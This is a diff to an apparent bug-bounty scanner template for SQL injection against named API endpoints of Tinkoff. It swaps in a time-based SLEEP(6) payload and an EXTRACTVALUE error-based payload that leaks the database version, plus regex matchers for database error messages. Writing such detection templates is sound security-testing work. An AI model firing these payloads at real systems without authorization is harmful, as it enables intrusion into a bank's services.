@@ -4,40 +4,40 @@ info:
   name: Tinkoff - SQL Injection
   author: bugbounty
   severity: critical
-  description: SQL injection in API endpoints with filtration and ID parameters
+  description: Time-based and error-based SQL injection in API endpoints
   tags: sqli,tinkoff
+  reference:
+    - https://portswigger.net/web-security/sql-injection
 
 http:
   - raw:
       - |
-        GET /api/common/v1/session_info?platform=web&sessionid=1' OR '1'='1 HTTP/1.1
+        GET /api/common/v1/session_info?platform=web&sessionid=test' AND (SELECT 1 FROM (SELECT(SLEEP(6)))a)-- HTTP/1.1
         Host: {{Hostname}}
+        Accept: application/json
 
       - |
-        GET /api/common/v1/session_info?platform=web' AND SLEEP(5)-- -&sessionid=test HTTP/1.1
+        GET /api/invest-gw/social/v1/post?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- HTTP/1.1
         Host: {{Hostname}}
-
-      - |
-        GET /api/invest/portfolio/instruments/v2?tickers=AAPL' UNION SELECT NULL-- - HTTP/1.1
-        Host: {{Hostname}}
-
-      - |
-        GET /api/invest-gw/social/v1/post?id=1' OR 1=1-- - HTTP/1.1
-        Host: {{Hostname}}
+        Accept: application/json
 
     matchers-condition: or
     matchers:
-      - type: word
-        part: body
-        words:
-          - "SQL syntax"
-          - "mysql_fetch"
-          - "PostgreSQL"
-          - "ORA-"
-          - "syntax error"
-
       - type: dsl
+        name: time-based-sqli
         dsl:
-          - 'duration>=5'
+          - 'duration>=6'
           - 'status_code == 200'
         condition: and
+
+      - type: regex
+        name: error-based-sqli
+        part: body
+        regex:
+          - "XPATH syntax error: '~[0-9]"
+          - "supplied argument is not a valid MySQL"
+          - "You have an error in your SQL syntax"
+          - "Warning.*mysql_.*"
+          - "PostgreSQL.*ERROR"
+          - "ORA-[0-9]{5}"
+        condition: or
